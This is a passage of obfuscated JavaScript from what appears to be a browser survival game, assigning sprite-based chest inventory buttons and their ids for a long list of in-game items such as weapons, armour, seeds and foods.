                    this.chest_buttons[Be.WOOD_DOOR].id = Be.WOOD_DOOR,
                    this.chest_buttons[Be.CHEST] = be(68, 68, 0, sprite[ze.CHEST_CHEST], 3),
                    this.chest_buttons[Be.CHEST].id = Be.CHEST,
                    this.chest_buttons[Be.STONE_SPIKE] = be(68, 68, 0, sprite[ze.CHEST_STONE_SPIKE], 3),
                    this.chest_buttons[Be.STONE_SPIKE].id = Be.STONE_SPIKE,
                    this.chest_buttons[Be.GOLD_SPIKE] = be(68, 68, 0, sprite[ze.CHEST_GOLD_SPIKE], 3),
                    this.chest_buttons[Be.GOLD_SPIKE].id = Be.GOLD_SPIKE,
                    this.chest_buttons[Be.DIAMOND_SPIKE] = be(68, 68, 0, sprite[ze.CHEST_DIAMOND_SPIKE], 3),
                    this.chest_buttons[Be.DIAMOND_SPIKE].id = Be.DIAMOND_SPIKE,
                    this.chest_buttons[Be.FUR] = be(68, 68, 0, sprite[ze.CHEST_FUR], 3),
                    this.chest_buttons[Be.FUR].id = Be.FUR,
                    this.chest_buttons[Be.FUR_BOAR] = be(68, 68, 0, sprite[ze.CHEST_FUR_BOAR], 3),
                    this.chest_buttons[Be.FUR_BOAR].id = Be.FUR_BOAR,
                    this.chest_buttons[Be.FUR_WOLF] = be(68, 68, 0, sprite[ze.CHEST_FUR_WOLF], 3),
                    this.chest_buttons[Be.FUR_WOLF].id = Be.FUR_WOLF,
                    this.chest_buttons[Be.PENGUIN_FEATHER] = be(68, 68, 0, sprite[ze.CHEST_PENGUIN_FEATHER], 3),
                    this.chest_buttons[Be.PENGUIN_FEATHER].id = Be.PENGUIN_FEATHER,
                    this.chest_buttons[Be.HAWK_FEATHER] = be(68, 68, 0, sprite[ze.CHEST_HAWK_FEATHER], 3),
                    this.chest_buttons[Be.HAWK_FEATHER].id = Be.HAWK_FEATHER,
                    this.chest_buttons[Be.VULTURE_FEATHER] = be(68, 68, 0, sprite[ze.CHEST_VULTURE_FEATHER], 3),
                    this.chest_buttons[Be.VULTURE_FEATHER].id = Be.VULTURE_FEATHER,
                    this.chest_buttons[Be.EMERALD] = be(68, 68, 0, sprite[ze.CHEST_EMERALD], 3),
                    this.chest_buttons[Be.EMERALD].id = Be.EMERALD,
                    this.chest_buttons[Be.EARMUFFS] = be(68, 68, 0, sprite[ze.CHEST_EARMUFFS], 3),
                    this.chest_buttons[Be.EARMUFFS].id = Be.EARMUFFS,
                    this.chest_buttons[Be.STONE_DOOR] = be(68, 68, 0, sprite[ze.CHEST_DOOR_STONE_CLOSE], 3),
                    this.chest_buttons[Be.STONE_DOOR].id = Be.STONE_DOOR,
                    this.chest_buttons[Be.GOLD_DOOR] = be(68, 68, 0, sprite[ze.CHEST_DOOR_GOLD_CLOSE], 3),
                    this.chest_buttons[Be.GOLD_DOOR].id = Be.GOLD_DOOR,
                    this.chest_buttons[Be.DIAMOND_DOOR] = be(68, 68, 0, sprite[ze.CHEST_DOOR_DIAMOND_CLOSE], 3),
                    this.chest_buttons[Be.DIAMOND_DOOR].id = Be.DIAMOND_DOOR,
                    this.chest_buttons[Be.COAT] = be(68, 68, 0, sprite[ze.CHEST_COAT], 3),
                    this.chest_buttons[Be.COAT].id = Be.COAT,
                    this.chest_buttons[Be.WOOD_SPEAR] = be(68, 68, 0, sprite[ze.CHEST_WOOD_SPEAR], 3),
                    this.chest_buttons[Be.WOOD_SPEAR].id = Be.WOOD_SPEAR,
                    this.chest_buttons[Be.SPEAR] = be(68, 68, 0, sprite[ze.CHEST_SPEAR], 3),
                    this.chest_buttons[Be.SPEAR].id = Be.SPEAR,
                    this.chest_buttons[Be.GOLD_SPEAR] = be(68, 68, 0, sprite[ze.CHEST_GOLD_SPEAR], 3),
                    this.chest_buttons[Be.GOLD_SPEAR].id = Be.GOLD_SPEAR,
                    this.chest_buttons[Be.DIAMOND_SPEAR] = be(68, 68, 0, sprite[ze.CHEST_DIAMOND_SPEAR], 3),
                    this.chest_buttons[Be.DIAMOND_SPEAR].id = Be.DIAMOND_SPEAR,
                    this.chest_buttons[Be.DRAGON_SPEAR] = be(68, 68, 0, sprite[ze.CHEST_DRAGON_SPEAR], 3),
                    this.chest_buttons[Be.DRAGON_SPEAR].id = Be.DRAGON_SPEAR,
                    this.chest_buttons[Be.FURNACE] = be(68, 68, 0, sprite[ze.CHEST_FURNACE], 3),
                    this.chest_buttons[Be.FURNACE].id = Be.FURNACE,
                    this.chest_buttons[Be.EXPLORER_HAT] = be(68, 68, 0, sprite[ze.CHEST_EXPLORER_HAT], 3),
                    this.chest_buttons[Be.EXPLORER_HAT].id = Be.EXPLORER_HAT,
                    this.chest_buttons[Be.PIRATE_HAT] = be(68, 68, 0, sprite[ze.CHEST_PIRATE_HAT], 3),
                    this.chest_buttons[Be.PIRATE_HAT].id = Be.PIRATE_HAT,
                    this.chest_buttons[Be.FLOWER_HAT] = be(68, 68, 0, sprite[ze.CHEST_FLOWER_HAT], 3),
                    this.chest_buttons[Be.FLOWER_HAT].id = Be.FLOWER_HAT,
                    this.chest_buttons[Be.FUR_HAT] = be(68, 68, 0, sprite[ze.CHEST_FUR_HAT], 3),
                    this.chest_buttons[Be.FUR_HAT].id = Be.FUR_HAT,
                    this.chest_buttons[Be.TURBAN1] = be(68, 68, 0, sprite[ze.CHEST_TURBAN1], 3),
                    this.chest_buttons[Be.TURBAN1].id = Be.TURBAN1,
                    this.chest_buttons[Be.TURBAN2] = be(68, 68, 0, sprite[ze.CHEST_TURBAN2], 3),
                    this.chest_buttons[Be.TURBAN2].id = Be.TURBAN2,
                    this.chest_buttons[Be.WOOD_ARROW] = be(68, 68, 0, sprite[ze.CHEST_WOOD_ARROW], 3),
                    this.chest_buttons[Be.WOOD_ARROW].id = Be.WOOD_ARROW,
                    this.chest_buttons[Be.WOOD_BOW] = be(68, 68, 0, sprite[ze.CHEST_WOOD_BOW], 3),
                    this.chest_buttons[Be.WOOD_BOW].id = Be.WOOD_BOW,
                    this.chest_buttons[Be.WOOD_SHIELD] = be(68, 68, 0, sprite[ze.CHEST_WOOD_SHIELD], 3),
                    this.chest_buttons[Be.WOOD_SHIELD].id = Be.WOOD_SHIELD,
                    this.chest_buttons[Be.STONE_ARROW] = be(68, 68, 0, sprite[ze.CHEST_STONE_ARROW], 3),
                    this.chest_buttons[Be.STONE_ARROW].id = Be.STONE_ARROW,
                    this.chest_buttons[Be.STONE_BOW] = be(68, 68, 0, sprite[ze.CHEST_STONE_BOW], 3),
                    this.chest_buttons[Be.STONE_BOW].id = Be.STONE_BOW,
                    this.chest_buttons[Be.STONE_SHIELD] = be(68, 68, 0, sprite[ze.CHEST_STONE_SHIELD], 3),
                    this.chest_buttons[Be.STONE_SHIELD].id = Be.STONE_SHIELD,
                    this.chest_buttons[Be.GOLD_ARROW] = be(68, 68, 0, sprite[ze.CHEST_GOLD_ARROW], 3),
                    this.chest_buttons[Be.GOLD_ARROW].id = Be.GOLD_ARROW,
                    this.chest_buttons[Be.GOLD_BOW] = be(68, 68, 0, sprite[ze.CHEST_GOLD_BOW], 3),
                    this.chest_buttons[Be.GOLD_BOW].id = Be.GOLD_BOW,
                    this.chest_buttons[Be.GOLD_SHIELD] = be(68, 68, 0, sprite[ze.CHEST_GOLD_SHIELD], 3),
                    this.chest_buttons[Be.GOLD_SHIELD].id = Be.GOLD_SHIELD,
                    this.chest_buttons[Be.DIAMOND_ARROW] = be(68, 68, 0, sprite[ze.CHEST_DIAMOND_ARROW], 3),
                    this.chest_buttons[Be.DIAMOND_ARROW].id = Be.DIAMOND_ARROW,
                    this.chest_buttons[Be.DIAMOND_BOW] = be(68, 68, 0, sprite[ze.CHEST_DIAMOND_BOW], 3),
                    this.chest_buttons[Be.DIAMOND_BOW].id = Be.DIAMOND_BOW,
                    this.chest_buttons[Be.DIAMOND_SHIELD] = be(68, 68, 0, sprite[ze.CHEST_DIAMOND_SHIELD], 3),
                    this.chest_buttons[Be.DIAMOND_SHIELD].id = Be.DIAMOND_SHIELD,
                    this.chest_buttons[Be.AMETHYST_ARROW] = be(68, 68, 0, sprite[ze.CHEST_AMETHYST_ARROW], 3),
                    this.chest_buttons[Be.AMETHYST_ARROW].id = Be.AMETHYST_ARROW,
                    this.chest_buttons[Be.AMETHYST_BOW] = be(68, 68, 0, sprite[ze.CHEST_AMETHYST_BOW], 3),
                    this.chest_buttons[Be.AMETHYST_BOW].id = Be.AMETHYST_BOW,
                    this.chest_buttons[Be.AMETHYST_SHIELD] = be(68, 68, 0, sprite[ze.CHEST_AMETHYST_SHIELD], 3),
                    this.chest_buttons[Be.AMETHYST_SHIELD].id = Be.AMETHYST_SHIELD,
                    this.chest_buttons[Be.REIDITE_ARROW] = be(68, 68, 0, sprite[ze.CHEST_REIDITE_ARROW], 3),
                    this.chest_buttons[Be.REIDITE_ARROW].id = Be.REIDITE_ARROW,
                    this.chest_buttons[Be.REIDITE_BOW] = be(68, 68, 0, sprite[ze.CHEST_REIDITE_BOW], 3),
                    this.chest_buttons[Be.REIDITE_BOW].id = Be.REIDITE_BOW,
                    this.chest_buttons[Be.REIDITE_SHIELD] = be(68, 68, 0, sprite[ze.CHEST_REIDITE_SHIELD], 3),
                    this.chest_buttons[Be.REIDITE_SHIELD].id = Be.REIDITE_SHIELD,
                    this.chest_buttons[Be.DRAGON_ARROW] = be(68, 68, 0, sprite[ze.CHEST_DRAGON_ARROW], 3),
                    this.chest_buttons[Be.DRAGON_ARROW].id = Be.DRAGON_ARROW,
                    this.chest_buttons[Be.DRAGON_BOW] = be(68, 68, 0, sprite[ze.CHEST_DRAGON_BOW], 3),
                    this.chest_buttons[Be.DRAGON_BOW].id = Be.DRAGON_BOW,
                    this.chest_buttons[Be.WOOD_HELMET] = be(68, 68, 0, sprite[ze.CHEST_WOOD_HELMET], 3),
                    this.chest_buttons[Be.WOOD_HELMET].id = Be.WOOD_HELMET,
                    this.chest_buttons[Be.STONE_HELMET] = be(68, 68, 0, sprite[ze.CHEST_STONE_HELMET], 3),
                    this.chest_buttons[Be.STONE_HELMET].id = Be.STONE_HELMET,
                    this.chest_buttons[Be.GOLD_HELMET] = be(68, 68, 0, sprite[ze.CHEST_GOLD_HELMET], 3),
                    this.chest_buttons[Be.GOLD_HELMET].id = Be.GOLD_HELMET,
                    this.chest_buttons[Be.DIAMOND_HELMET] = be(68, 68, 0, sprite[ze.CHEST_DIAMOND_HELMET], 3),
                    this.chest_buttons[Be.DIAMOND_HELMET].id = Be.DIAMOND_HELMET,
                    this.chest_buttons[Be.BOOK] = be(68, 68, 0, sprite[ze.CHEST_BOOK], 3),
                    this.chest_buttons[Be.BOOK].id = Be.BOOK,
                    this.chest_buttons[Be.PAPER] = be(68, 68, 0, sprite[ze.CHEST_PAPER], 3),
                    this.chest_buttons[Be.PAPER].id = Be.PAPER,
                    this.chest_buttons[Be.BAG] = be(68, 68, 0, sprite[ze.CHEST_BAG], 3),
                    this.chest_buttons[Be.BAG].id = Be.BAG,
                    this.chest_buttons[Be.AMETHYST] = be(68, 68, 0, sprite[ze.CHEST_AMETHYST], 3),
                    this.chest_buttons[Be.AMETHYST].id = Be.AMETHYST,
                    this.chest_buttons[Be.SWORD_AMETHYST] = be(68, 68, 0, sprite[ze.CHEST_SWORD_AMETHYST], 3),
                    this.chest_buttons[Be.SWORD_AMETHYST].id = Be.SWORD_AMETHYST,
                    this.chest_buttons[Be.PIRATE_SWORD] = be(68, 68, 0, sprite[ze.CHEST_PIRATE_SWORD], 3),
                    this.chest_buttons[Be.PIRATE_SWORD].id = Be.PIRATE_SWORD,
                    this.chest_buttons[Be.PICK_AMETHYST] = be(68, 68, 0, sprite[ze.CHEST_PICK_AMETHYST], 3),
                    this.chest_buttons[Be.PICK_AMETHYST].id = Be.PICK_AMETHYST,
                    this.chest_buttons[Be.PICK_REIDITE] = be(68, 68, 0, sprite[ze.CHEST_PICK_REIDITE], 3),
                    this.chest_buttons[Be.PICK_REIDITE].id = Be.PICK_REIDITE,
                    this.chest_buttons[Be.AMETHYST_SPEAR] = be(68, 68, 0, sprite[ze.CHEST_AMETHYST_SPEAR], 3),
                    this.chest_buttons[Be.AMETHYST_SPEAR].id = Be.AMETHYST_SPEAR,
                    this.chest_buttons[Be.HAMMER] = be(68, 68, 0, sprite[ze.CHEST_HAMMER], 3),
                    this.chest_buttons[Be.HAMMER].id = Be.HAMMER,
                    this.chest_buttons[Be.HAMMER_GOLD] = be(68, 68, 0, sprite[ze.CHEST_HAMMER_GOLD], 3),
                    this.chest_buttons[Be.HAMMER_GOLD].id = Be.HAMMER_GOLD,
                    this.chest_buttons[Be.HAMMER_DIAMOND] = be(68, 68, 0, sprite[ze.CHEST_HAMMER_DIAMOND], 3),
                    this.chest_buttons[Be.HAMMER_DIAMOND].id = Be.HAMMER_DIAMOND,
                    this.chest_buttons[Be.HAMMER_AMETHYST] = be(68, 68, 0, sprite[ze.CHEST_HAMMER_AMETHYST], 3),
                    this.chest_buttons[Be.HAMMER_AMETHYST].id = Be.HAMMER_AMETHYST,
                    this.chest_buttons[Be.HAMMER_REIDITE] = be(68, 68, 0, sprite[ze.CHEST_HAMMER_REIDITE], 3),
                    this.chest_buttons[Be.HAMMER_REIDITE].id = Be.HAMMER_REIDITE,
                    this.chest_buttons[Be.AMETHYST_WALL] = be(68, 68, 0, sprite[ze.CHEST_AMETHYST_WALL], 3),
                    this.chest_buttons[Be.AMETHYST_WALL].id = Be.AMETHYST_WALL,
                    this.chest_buttons[Be.AMETHYST_SPIKE] = be(68, 68, 0, sprite[ze.CHEST_AMETHYST_SPIKE], 3),
                    this.chest_buttons[Be.AMETHYST_SPIKE].id = Be.AMETHYST_SPIKE,
                    this.chest_buttons[Be.AMETHYST_DOOR] = be(68, 68, 0, sprite[ze.CHEST_DOOR_AMETHYST_CLOSE], 3),
                    this.chest_buttons[Be.AMETHYST_DOOR].id = Be.AMETHYST_DOOR,
                    this.chest_buttons[Be.CAP_SCARF] = be(68, 68, 0, sprite[ze.CHEST_CAP_SCARF], 3),
                    this.chest_buttons[Be.CAP_SCARF].id = Be.CAP_SCARF,
                    this.chest_buttons[Be.FUR_WINTER] = be(68, 68, 0, sprite[ze.CHEST_FUR_WINTER], 3),
                    this.chest_buttons[Be.FUR_WINTER].id = Be.FUR_WINTER,
                    this.chest_buttons[Be.FUR_MAMMOTH] = be(68, 68, 0, sprite[ze.CHEST_FUR_MAMMOTH], 3),
                    this.chest_buttons[Be.FUR_MAMMOTH].id = Be.FUR_MAMMOTH,
                    this.chest_buttons[Be.BLUE_CORD] = be(68, 68, 0, sprite[ze.CHEST_BLUE_CORD], 3),
                    this.chest_buttons[Be.BLUE_CORD].id = Be.BLUE_CORD,
                    this.chest_buttons[Be.LOCK] = be(68, 68, 0, sprite[ze.CHEST_LOCK], 3),
                    this.chest_buttons[Be.LOCK].id = Be.LOCK,
                    this.chest_buttons[Be.DRAGON_HEART] = be(68, 68, 0, sprite[ze.CHEST_DRAGON_HEART], 3),
                    this.chest_buttons[Be.DRAGON_HEART].id = Be.DRAGON_HEART,
                    this.chest_buttons[Be.LAVA_HEART] = be(68, 68, 0, sprite[ze.CHEST_LAVA_HEART], 3),
                    this.chest_buttons[Be.LAVA_HEART].id = Be.LAVA_HEART,
                    this.chest_buttons[Be.RESURRECTION] = be(68, 68, 0, sprite[ze.CHEST_RESURRECTION], 3),
                    this.chest_buttons[Be.RESURRECTION].id = Be.RESURRECTION,
                    this.chest_buttons[Be.LOCKPICK] = be(68, 68, 0, sprite[ze.CHEST_LOCKPICK], 3),
                    this.chest_buttons[Be.LOCKPICK].id = Be.LOCKPICK,
                    this.chest_buttons[Be.TOTEM] = be(68, 68, 0, sprite[ze.CHEST_TOTEM], 3),
                    this.chest_buttons[Be.TOTEM].id = Be.TOTEM,
                    this.chest_buttons[Be.AMETHYST_HELMET] = be(68, 68, 0, sprite[ze.CHEST_AMETHYST_HELMET], 3),
                    this.chest_buttons[Be.AMETHYST_HELMET].id = Be.AMETHYST_HELMET,
                    this.chest_buttons[Be.SUPER_HAMMER] = be(68, 68, 0, sprite[ze.CHEST_SUPER_HAMMER], 3),
                    this.chest_buttons[Be.SUPER_HAMMER].id = Be.SUPER_HAMMER,
                    this.chest_buttons[Be.BRIDGE] = be(68, 68, 0, sprite[ze.CHEST_BRIDGE], 3),
                    this.chest_buttons[Be.BRIDGE].id = Be.BRIDGE,
                    this.chest_buttons[Be.WOOD_TOWER] = be(68, 68, 0, sprite[ze.CHEST_WOOD_TOWER], 3),
                    this.chest_buttons[Be.WOOD_TOWER].id = Be.WOOD_TOWER,
                    this.chest_buttons[Be.BOAT] = be(68, 68, 0, sprite[ze.CHEST_BOAT], 3),
                    this.chest_buttons[Be.BOAT].id = Be.BOAT,
                    this.chest_buttons[Be.SLED] = be(68, 68, 0, sprite[ze.CHEST_SLED], 3),
                    this.chest_buttons[Be.SLED].id = Be.SLED,
                    this.chest_buttons[Be.PLANE] = be(68, 68, 0, sprite[ze.CHEST_PLANE], 3),
                    this.chest_buttons[Be.PLANE].id = Be.PLANE,
                    this.chest_buttons[Be.SADDLE] = be(68, 68, 0, sprite[ze.CHEST_SADDLE], 3),
                    this.chest_buttons[Be.SADDLE].id = Be.SADDLE,
                    this.chest_buttons[Be.MOUNT_BOAR] = be(68, 68, 0, sprite[ze.CHEST_MOUNT_BOAR], 3),
                    this.chest_buttons[Be.MOUNT_BOAR].id = Be.MOUNT_BOAR,
                    this.chest_buttons[Be.BABY_DRAGON] = be(68, 68, 0, sprite[ze.CHEST_BABY_DRAGON], 3),
                    this.chest_buttons[Be.BABY_DRAGON].id = Be.BABY_DRAGON,
                    this.chest_buttons[Be.BABY_MAMMOTH] = be(68, 68, 0, sprite[ze.CHEST_BABY_MAMMOTH], 3),
                    this.chest_buttons[Be.BABY_MAMMOTH].id = Be.BABY_MAMMOTH,
                    this.chest_buttons[Be.BABY_LAVA] = be(68, 68, 0, sprite[ze.CHEST_BABY_LAVA], 3),
                    this.chest_buttons[Be.BABY_LAVA].id = Be.BABY_LAVA,
                    this.chest_buttons[Be.HAWK] = be(68, 68, 0, sprite[ze.CHEST_HAWK], 3),
                    this.chest_buttons[Be.HAWK].id = Be.HAWK,
                    this.chest_buttons[Be.CRAB_BOSS] = be(68, 68, 0, sprite[ze.CHEST_CRAB_BOSS], 3),
                    this.chest_buttons[Be.CRAB_BOSS].id = Be.CRAB_BOSS,
                    this.chest_buttons[Be.SAND] = be(68, 68, 0, sprite[ze.CHEST_SAND], 3),
                    this.chest_buttons[Be.SAND].id = Be.SAND,
                    this.chest_buttons[Be.BOTTLE_FULL] = be(68, 68, 0, sprite[ze.CHEST_BOTTLE_FULL], 3),
                    this.chest_buttons[Be.BOTTLE_FULL].id = Be.BOTTLE_FULL,
                    this.chest_buttons[Be.BOTTLE_EMPTY] = be(68, 68, 0, sprite[ze.CHEST_BOTTLE_EMPTY], 3),
                    this.chest_buttons[Be.BOTTLE_EMPTY].id = Be.BOTTLE_EMPTY,
                    this.chest_buttons[Be.SHOVEL] = be(68, 68, 0, sprite[ze.CHEST_SHOVEL], 3),
                    this.chest_buttons[Be.SHOVEL].id = Be.SHOVEL,
                    this.chest_buttons[Be.SHOVEL_GOLD] = be(68, 68, 0, sprite[ze.CHEST_SHOVEL_GOLD], 3),
                    this.chest_buttons[Be.SHOVEL_GOLD].id = Be.SHOVEL_GOLD,
                    this.chest_buttons[Be.SHOVEL_DIAMOND] = be(68, 68, 0, sprite[ze.CHEST_SHOVEL_DIAMOND], 3),
                    this.chest_buttons[Be.SHOVEL_DIAMOND].id = Be.SHOVEL_DIAMOND,
                    this.chest_buttons[Be.SHOVEL_AMETHYST] = be(68, 68, 0, sprite[ze.CHEST_SHOVEL_AMETHYST], 3),
                    this.chest_buttons[Be.SHOVEL_AMETHYST].id = Be.SHOVEL_AMETHYST,
                    this.chest_buttons[Be.SPANNER] = be(68, 68, 0, sprite[ze.CHEST_SPANNER], 3),
                    this.chest_buttons[Be.SPANNER].id = Be.SPANNER,
                    this.chest_buttons[Be.KRAKEN_SKIN] = be(68, 68, 0, sprite[ze.CHEST_KRAKEN_SKIN], 3),
                    this.chest_buttons[Be.KRAKEN_SKIN].id = Be.KRAKEN_SKIN,
                    this.chest_buttons[Be.WATERING_CAN] = be(68, 68, 0, sprite[ze.CHEST_WATERING_CAN], 3),
                    this.chest_buttons[Be.WATERING_CAN].id = Be.WATERING_CAN,
                    this.chest_buttons[Be.FLOUR] = be(68, 68, 0, sprite[ze.CHEST_FLOUR], 3),
                    this.chest_buttons[Be.FLOUR].id = Be.FLOUR,
                    this.chest_buttons[Be.WHEAT_SEED] = be(68, 68, 0, sprite[ze.CHEST_WHEAT_SEED], 3),
                    this.chest_buttons[Be.WHEAT_SEED].id = Be.WHEAT_SEED,
                    this.chest_buttons[Be.COOKIE] = be(68, 68, 0, sprite[ze.CHEST_COOKIE], 3),
                    this.chest_buttons[Be.COOKIE].id = Be.COOKIE,
                    this.chest_buttons[Be.WILD_WHEAT] = be(68, 68, 0, sprite[ze.CHEST_WILD_WHEAT], 3),
                    this.chest_buttons[Be.WILD_WHEAT].id = Be.WILD_WHEAT,
                    this.chest_buttons[Be.WINDMILL] = be(68, 68, 0, sprite[ze.CHEST_WINDMILL], 3),
                    this.chest_buttons[Be.WINDMILL].id = Be.WINDMILL,
                    this.chest_buttons[Be.SUPER_DIVING_SUIT] = be(68, 68, 0, sprite[ze.CHEST_SUPER_DIVING_SUIT], 3),
                    this.chest_buttons[Be.SUPER_DIVING_SUIT].id = Be.SUPER_DIVING_SUIT,
                    this.chest_buttons[Be.DIVING_MASK] = be(68, 68, 0, sprite[ze.CHEST_DIVING_MASK], 3),
                    this.chest_buttons[Be.DIVING_MASK].id = Be.DIVING_MASK,
                    this.chest_buttons[Be.WATERING_CAN_FULL] = be(68, 68, 0, sprite[ze.CHEST_WATERING_CAN_FULL], 3),
                    this.chest_buttons[Be.WATERING_CAN_FULL].id = Be.WATERING_CAN_FULL,
                    this.chest_buttons[Be.CAKE] = be(68, 68, 0, sprite[ze.CHEST_CAKE], 3),
                    this.chest_buttons[Be.CAKE].id = Be.CAKE,
                    this.chest_buttons[Be.BREAD] = be(68, 68, 0, sprite[ze.CHEST_BREAD], 3),
                    this.chest_buttons[Be.BREAD].id = Be.BREAD,
                    this.chest_buttons[Be.FOODFISH] = be(68, 68, 0, sprite[ze.CHEST_FOODFISH], 3),
                    this.chest_buttons[Be.FOODFISH].id = Be.FOODFISH,
                    this.chest_buttons[Be.FOODFISH_COOKED] = be(68, 68, 0, sprite[ze.CHEST_FOODFISH_COOKED], 3),
                    this.chest_buttons[Be.FOODFISH_COOKED].id = Be.FOODFISH_COOKED,
                    this.chest_buttons[Be.SCALES] = be(68, 68, 0, sprite[ze.CHEST_SCALES], 3),
                    this.chest_buttons[Be.SCALES].id = Be.SCALES,
                    this.chest_buttons[Be.GROUND] = be(68, 68, 0, sprite[ze.CHEST_GROUND], 3),
                    this.chest_buttons[Be.GROUND].id = Be.GROUND,
                    this.chest_buttons[Be.PLOT] = be(68, 68, 0, sprite[ze.CHEST_PLOT], 3),
                    this.chest_buttons[Be.PLOT].id = Be.PLOT,
                    this.chest_buttons[Be.ICE] = be(68, 68, 0, sprite[ze.CHEST_ICE], 3),
                    this.chest_buttons[Be.ICE].id = Be.ICE,
                    this.chest_buttons[Be.BREAD_OVEN] = be(68, 68, 0, sprite[ze.CHEST_BREAD_OVEN], 3),
                    this.chest_buttons[Be.BREAD_OVEN].id = Be.BREAD_OVEN,
                    this.chest_buttons[Be.SANDWICH] = be(68, 68, 0, sprite[ze.CHEST_SANDWICH], 3),
                    this.chest_buttons[Be.SANDWICH].id = Be.SANDWICH,
                    this.chest_buttons[Be.DRAGON_HELMET] = be(68, 68, 0, sprite[ze.CHEST_DRAGON_HELMET], 3),
                    this.chest_buttons[Be.DRAGON_HELMET].id = Be.DRAGON_HELMET,
                    this.chest_buttons[Be.DRAGON_SWORD] = be(68, 68, 0, sprite[ze.CHEST_DRAGON_SWORD], 3),
                    this.chest_buttons[Be.DRAGON_SWORD].id = Be.DRAGON_SWORD,
                    this.chest_buttons[Be.DRAGON_ORB] = be(68, 68, 0, sprite[ze.CHEST_DRAGON_ORB], 3),
                    this.chest_buttons[Be.DRAGON_ORB].id = Be.DRAGON_ORB,
                    this.chest_buttons[Be.DRAGON_CUBE] = be(68, 68, 0, sprite[ze.CHEST_DRAGON_CUBE], 3),
                    this.chest_buttons[Be.DRAGON_CUBE].id = Be.DRAGON_CUBE,
                    this.chest_buttons[Be.LAVA_ORB] = be(68, 68, 0, sprite[ze.CHEST_LAVA_ORB], 3),
                    this.chest_buttons[Be.LAVA_ORB].id = Be.LAVA_ORB,
                    this.chest_buttons[Be.LAVA_CUBE] = be(68, 68, 0, sprite[ze.CHEST_LAVA_CUBE], 3),
                    this.chest_buttons[Be.LAVA_CUBE].id = Be.LAVA_CUBE,
                    this.chest_buttons[Be.CROWN_GREEN] = be(68, 68, 0, sprite[ze.CHEST_CROWN_GREEN], 3),
                    this.chest_buttons[Be.CROWN_GREEN].id = Be.CROWN_GREEN,
                    this.chest_buttons[Be.GEMME_GREEN] = be(68, 68, 0, sprite[ze.CHEST_GEMME_GREEN], 3),
                    this.chest_buttons[Be.GEMME_GREEN].id = Be.GEMME_GREEN,
                    this.chest_buttons[Be.GEMME_ORANGE] = be(68, 68, 0, sprite[ze.CHEST_GEMME_ORANGE], 3),
                    this.chest_buttons[Be.GEMME_ORANGE].id = Be.GEMME_ORANGE,
                    this.chest_buttons[Be.CROWN_ORANGE] = be(68, 68, 0, sprite[ze.CHEST_CROWN_ORANGE], 3),
                    this.chest_buttons[Be.CROWN_ORANGE].id = Be.CROWN_ORANGE,
                    this.chest_buttons[Be.GEMME_BLUE] = be(68, 68, 0, sprite[ze.CHEST_GEMME_BLUE], 3),
                    this.chest_buttons[Be.GEMME_BLUE].id = Be.GEMME_BLUE,
                    this.chest_buttons[Be.CROWN_BLUE] = be(68, 68, 0, sprite[ze.CHEST_CROWN_BLUE], 3),
                    this.chest_buttons[Be.CROWN_BLUE].id = Be.CROWN_BLUE,
                    this.chest_buttons[Be.HOOD] = be(68, 68, 0, sprite[ze.CHEST_HOOD], 3),
                    this.chest_buttons[Be.HOOD].id = Be.HOOD,
                    this.chest_buttons[Be.PEASANT] = be(68, 68, 0, sprite[ze.CHEST_PEASANT], 3),
                    this.chest_buttons[Be.PEASANT].id = Be.PEASANT,
                    this.chest_buttons[Be.SPECIAL_FUR] = be(68, 68, 0, sprite[ze.CHEST_SPECIAL_FUR], 3),
                    this.chest_buttons[Be.SPECIAL_FUR].id = Be.SPECIAL_FUR,
                    this.chest_buttons[Be.SPECIAL_FUR_2] = be(68, 68, 0, sprite[ze.CHEST_SPECIAL_FUR_2], 3),
                    this.chest_buttons[Be.SPECIAL_FUR_2].id = Be.SPECIAL_FUR_2,
                    this.chest_buttons[Be.WINTER_PEASANT] = be(68, 68, 0, sprite[ze.CHEST_WINTER_PEASANT], 3),
                    this.chest_buttons[Be.WINTER_PEASANT].id = Be.WINTER_PEASANT,
                    this.chest_buttons[Be.WINTER_HOOD] = be(68, 68, 0, sprite[ze.CHEST_WINTER_HOOD], 3),
                    this.chest_buttons[Be.WINTER_HOOD].id = Be.WINTER_HOOD,
                    this.chest_buttons[Be.BUCKET_FULL] = be(68, 68, 0, sprite[ze.CHEST_BUCKET_FULL], 3),
                    this.chest_buttons[Be.BUCKET_FULL].id = Be.BUCKET_FULL,
                    this.chest_buttons[Be.BUCKET_EMPTY] = be(68, 68, 0, sprite[ze.CHEST_BUCKET_EMPTY], 3),
                    this.chest_buttons[Be.BUCKET_EMPTY].id = Be.BUCKET_EMPTY,
                    this.chest_buttons[Be.WELL] = be(68, 68, 0, sprite[ze.CHEST_WELL], 3),
                    this.chest_buttons[Be.WELL].id = Be.WELL,
                    this.chest_buttons[Be.SIGN] = be(68, 68, 0, sprite[ze.CHEST_SIGN], 3),
                    this.chest_buttons[Be.SIGN].id = Be.SIGN,
                    this.chest_buttons[Be.PUMPKIN_SEED] = be(68, 68, 0, sprite[ze.CHEST_PUMPKIN_SEED], 3),
                    this.chest_buttons[Be.PUMPKIN_SEED].id = Be.PUMPKIN_SEED,
                    this.chest_buttons[Be.PUMPKIN] = be(68, 68, 0, sprite[ze.CHEST_PUMPKIN], 3),
                    this.chest_buttons[Be.PUMPKIN].id = Be.PUMPKIN,
                    this.chest_buttons[Be.ROOF] = be(68, 68, 0, sprite[ze.CHEST_ROOF], 3),
                    this.chest_buttons[Be.ROOF].id = Be.ROOF,
                    this.chest_buttons[Be.GARLIC_SEED] = be(68, 68, 0, sprite[ze.CHEST_GARLIC_SEED], 3),
                    this.chest_buttons[Be.GARLIC_SEED].id = Be.GARLIC_SEED,
                    this.chest_buttons[Be.GARLIC] = be(68, 68, 0, sprite[ze.CHEST_GARLIC], 3),
                    this.chest_buttons[Be.GARLIC].id = Be.GARLIC,
                    this.chest_buttons[Be.THORNBUSH_SEED] = be(68, 68, 0, sprite[ze.CHEST_THORNBUSH_SEED], 3),
                    this.chest_buttons[Be.THORNBUSH_SEED].id = Be.THORNBUSH_SEED,
                    this.chest_buttons[Be.THORNBUSH] = be(68, 68, 0, sprite[ze.CHEST_THORNBUSH], 3),
                    this.chest_buttons[Be.THORNBUSH].id = Be.THORNBUSH,
                    this.chest_buttons[Be.TOMATO_SEED] = be(68, 68, 0, sprite[ze.CHEST_TOMATO_SEED], 3),
                    this.chest_buttons[Be.TOMATO_SEED].id = Be.TOMATO_SEED,
                    this.chest_buttons[Be.TOMATO] = be(68, 68, 0, sprite[ze.CHEST_TOMATO], 3),
                    this.chest_buttons[Be.TOMATO].id = Be.TOMATO,
